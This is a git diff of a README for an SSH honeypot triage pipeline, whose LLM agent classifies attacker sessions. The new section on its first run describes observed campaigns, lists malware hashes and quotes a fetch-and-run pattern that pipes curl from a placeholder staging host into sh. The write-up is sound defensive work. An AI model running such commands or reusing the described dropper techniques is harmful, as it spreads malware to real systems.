@@ -1,8 +1,8 @@
 # Cowrie honeypot triage agent
 
-> **Work in progress.** The ingestion pipeline and the deterministic tier 1 triage run in production on a
-> small VPS. The tier 2 LLM agent is implemented and covered by tests against a mocked API client; its
-> first real run against the live data is still pending. See [Status](#status).
+> **Work in progress.** The ingestion pipeline, the deterministic tier 1 triage and the tier 2 LLM agent
+> run on a small VPS. The agent's first real run is summarised in [First real run](#first-real-run);
+> alerts and enrichment are next. See [Status](#status).
 
 An SSH honeypot ([Cowrie](https://github.com/cowrie/cowrie)) collects real attacker traffic from the
 internet. This project turns those raw JSON logs into something an analyst can act on:
@@ -35,7 +35,7 @@ flowchart LR
 |---|---|---|---|
 | Loader | `src/loader.py` | stdlib, cron every 5 min | Incremental, rotation-safe (offsets per inode), idempotent ingestion of Cowrie events into `sessions`, `logins`, `commands`, `downloads`, `uploads`, `tunnels`. Computes a behavioural fingerprint per session. |
 | Fingerprint | `src/fingerprint.py` | stdlib | Hash of the *normalized* command sequence (SSH keys, URLs, IPs, blobs and long numbers masked), so the same playbook from different IPs collapses to one value. |
-| Tier 1 triage | `src/triage.py` | stdlib, called by the loader | Labels every closed session: `noise`, `known_campaign` or `unknown`, and flags the ones that need analysis (dropper pattern, first-seen upload/download hash, first-seen tunnel target, first-seen fingerprint). `--report` prints counts and the queue. |
+| Tier 1 triage | `src/triage.py` | stdlib, called by the loader | Labels every closed session: `noise`, `known_campaign` or `unknown`, and flags the ones that need analysis (dropper pattern, first-seen upload/download hash, first-seen tunnel target, first-seen fingerprint). Known campaigns found by tier 2 are codified here after human review. `--report` prints counts per label and the queue. |
 | Tier 2 agent | `src/agent.py` | Python venv + `anthropic` SDK | Groups the queue in code (by file hash, tunnel target, fingerprint), runs a short tool-use loop per group, validates the model's verdict and stores it in `analysis`. Also `chat` for ad hoc questions over the data. |
 | Housekeeping | `src/housekeeping.py` | stdlib, cron hourly | Deletes rotated logs only when older than 30 days **and** fully ingested; low-disk alert to Telegram with cooldown. |
 | Schema | `src/schema.sql` | | All tables, additive migrations only. |
@@ -103,13 +103,62 @@ No attacker IPs are published here.
   several kinds of loot at once.
 - **Scanner markers** such as `echo SSHOLE_<epoch>`, which is why the fingerprint masks long numbers.
 
-Public IOCs (truncated SHA-256 of files uploaded to the honeypot; lookup by hash only):
+Public IOCs (SHA-256 of files uploaded to the honeypot; look up by hash only, never fetch or run):
 
-| Hash prefix | Seen as | Notes |
+| SHA-256 | Seen as | Notes |
 |---|---|---|
-| `6e78b3f8…` | SFTP upload named `sshd` | multiple sessions, pending VirusTotal lookup |
-| `6d1fe6ab…` | scp dropper file | same file from several IPs |
+| `6e78b3f84453618ec1eab60674e01f36a08a740a95c50b99154ad0552075d924` | SFTP upload named `sshd`, Go SSH client | 18 uploads from 18 IPs; VirusTotal lookup pending |
+| `6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b` | scp dropper file (`pi` default credentials) | 6 uploads from 3 IPs; VirusTotal lookup pending |
 | `e3b0c442…` | SFTP upload | SHA-256 of the empty file, not a payload |
+
+## First real run
+
+On 2026-11-20 the agent ran against the live tier 2 queue for the first time.
+
+| | |
+|---|---|
+| Sessions triaged by tier 1 | about 21,000 (three weeks) |
+| Tier 2 queue | 22 sessions in 14 groups |
+| Verdicts | 11 (10 groups in one run plus one earlier single-group test) |
+| Cost | 29 API calls in the main run, about **$0.02** in total on the cheapest model |
+
+What the agent found:
+
+- **Raspberry Pi scp dropper.** Logins with the default `pi` credentials push one binary over scp
+  to `/tmp/<random 8 chars>` and run it with `chmod +x` and `bash -c`. Same hash from 3 IPs in
+  three waves, upload and execution often in separate sessions.
+- **Go `sshd` implant upload.** A Go SSH client logs in as root and uploads a file named `sshd`
+  without running any command. Same hash 18 times from 18 IPs.
+- **SSHOLE access verifier.** A paramiko client with a padding password echoes `SSHOLE_<epoch>`
+  markers around `id` and exit-code checks. Some of its sessions also pipe
+  `curl http://<staging host>:800/ol.sh` into `sh`.
+- **Telegram and SMS modem hunting.** One script from 14 IPs looks for Telegram Desktop `tdata`
+  session files, GSM/USB modems and SMS daemons, running miners and MikroTik RouterOS.
+- **SMTP relay campaign.** 807 sessions from 610 IPs, with 332 different credential pairs, open a
+  `direct-tcpip` tunnel to one public mail server on port 25 and do nothing else.
+- Small things: connectivity checks through the honeypot to a well-known web host on port 80, and one
+  manual recon session that turned out to be my own test login (now excluded by `self_test`).
+
+Each verdict came with a suggested tier 1 rule. The reviewed versions are now tier 1 rules
+(`pi_scp_dropper`, `go_sshd_upload`, `sshole_dropper`, `sshole_access_check`, `infostealer_recon`,
+`spam_relay`, `proxy_abuse`; see [docs/design.md](docs/design.md)), so these repeats no longer
+reach the model, while a new hash, tunnel target or staging URL still does.
+
+Lessons:
+
+- **Per-group analysis misses cross-group links.** The SSHOLE actor appeared under three
+  fingerprints and was labelled `scanner_recon` in one group and `malware_dropper` in two others.
+  Upload and execution of the Pi dropper also landed in different groups. Grouping by source IP
+  and HASSH before analysis is the next improvement.
+- **Agent output is untrusted.** Rule suggestions are written by a model that has just read
+  attacker-controlled commands, and some were too broad (for example "any `curl | sh`"). A human
+  reviews and narrows every rule, with tests, before it is codified. Nothing is applied automatically.
+- **The egress filter mattered.** The honeypot container may only connect out on 80/443, so the
+  script staged on port 800 was most likely never fetched, and the port 25 tunnels never reached
+  the mail server. The flip side: no copy of that script was captured.
+- **It is cheap.** Two tiers make the LLM part cost cents per run, not dollars.
+
+Pending: VirusTotal lookups of the two hashes (hash only), AbuseIPDB reputation of the sources.
 
 ## Status
 
@@ -120,10 +169,11 @@ Public IOCs (truncated SHA-256 of files uploaded to the honeypot; lookup by hash
 - [x] Tier 1 triage: applied in production and tuned on real data (about 21k sessions triaged)
 - [x] Housekeeping: safe log retention, low-disk alert
 - [x] Tier 2 agent v0: tool-use loop, read-only tools, verdict validation, cost caps, `chat`.
-      Tested against a mocked API client (no network); first real run pending
+      First real run on the live queue: 11 verdicts for about $0.02
+- [x] Tier 1 rules codified from the reviewed agent verdicts; own test logins excluded (`self_test`)
 
 **Planned**
-- [ ] First real agent run on the live tier 2 queue, then prompt tuning
+- [ ] Prompt tuning, and grouping by source IP / HASSH so related sessions are analysed together
 - [ ] Enrichment: AbuseIPDB (IP reputation), VirusTotal (hash lookup only, never upload)
 - [ ] Campaign grouping by HASSH, broader MITRE ATT&CK mapping
 - [ ] Telegram alerts and a conversational interface, daily report
@@ -155,7 +205,7 @@ cp .env.example .env && chmod 600 .env     # then add your own key
 
 [![tests](../../actions/workflows/tests.yml/badge.svg)](../../actions/workflows/tests.yml)
 
-60 tests, synthetic data only (modelled on the real traffic, with documentation-range IPs), no
+65 tests, synthetic data only (modelled on the real traffic, with documentation-range IPs), no
 network and no API key: the Anthropic client is replaced by a scripted fake. No payload is
 executed; commands are plain strings.
 
@@ -166,7 +216,8 @@ python3 -m venv .venv && .venv/bin/pip install -r src/requirements.txt pytest
 
 - `tests/test_update.py`: loader against a database created by the old schema (migration,
   backfill, rotation, idempotence) and housekeeping retention and alert cooldown.
-- `tests/test_triage.py`: tier 1 rules end to end through the loader.
+- `tests/test_triage.py`: tier 1 rules end to end through the loader, including near-misses of
+  every codified campaign (extra command, other hash, new staging host) and the `self_test` allowlist.
 - `tests/test_agent.py`: grouping, read-only enforcement (writes, `ATTACH`, `load_extension`
   rejected), untrusted-data encoding and an injection payload, verdict validation, budget stops,
   secrets never printed.
